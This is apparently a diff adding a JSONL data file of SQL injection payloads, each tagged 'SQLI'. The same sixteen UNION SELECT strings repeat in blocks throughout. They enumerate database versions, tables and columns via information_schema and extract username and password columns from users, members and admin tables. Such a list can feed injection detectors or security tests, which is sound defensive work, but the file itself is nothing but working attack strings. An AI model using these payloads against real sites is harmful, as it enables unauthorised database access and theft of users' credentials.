@@ -1,0 +1,320 @@
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM users--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT database(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1, database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT user(), version()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, table_name FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT username, password FROM members--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, null--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 FROM dual--", "attack_type": "SQLI"}
+{"payload": "' UNION ALL SELECT null, username, password FROM admin--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--", "attack_type": "SQLI"}
+{"payload": "' UNION SELECT 1,2,3 WHERE 1=1--", "attack_type": "SQLI"}
